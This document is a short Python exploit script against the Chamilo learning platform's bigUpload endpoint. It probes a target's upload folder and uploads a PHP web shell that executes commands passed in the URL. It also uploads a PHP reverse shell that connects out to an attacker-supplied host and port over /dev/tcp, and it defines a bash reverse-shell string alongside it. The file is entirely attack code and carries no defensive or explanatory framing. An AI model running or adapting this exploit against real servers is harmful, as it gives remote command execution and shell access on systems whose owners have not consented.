import requests
from typing import Union


class ChamiloBigUploadExploit:
    def __init__(self, url: str, action: str) -> None:
        self.root_url = url
        self.check_url = f'{self.root_url}/main/inc/lib/javascript/bigupload/files/'
        self.vunerable_endpoint = f'{self.root_url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'


    def check_target_vulnerable(self) -> bool:
        response = requests.get(self.check_url)

        if response.status_code == 200:
            return True
        else:
            return False
        
    
    def send_webshell(self, filename: str = 'webshell.php') -> Union[str, bool]:
        webshell_content = '<?php echo system($_GET["cmd"])?>'

        response = requests.post(
            self.vunerable_endpoint,
            files={
                'bigUploadFile': (filename, webshell_content)
            }
        )

        if response.status_code == 200 and response.text == 'The file has successfully been uploaded.':
            return f'{self.check_url}{filename}'
        else:
            return False


    def send_revshell(self, host: str, port: int) -> None:
        bash_revshell_content = f'#!/bin/bash\nbash -i >& /dev/tcp/{host}/{port} 0>&1'
        revshell_content = f'<?php system("sh -i >& /dev/tcp/{host}/{port} 0>&1")?>'

        response = requests.post(
            self.vunerable_endpoint,
            files={
                'bigUploadFile': ('revshell.php', revshell_content)
            }
        )

        print(response.text)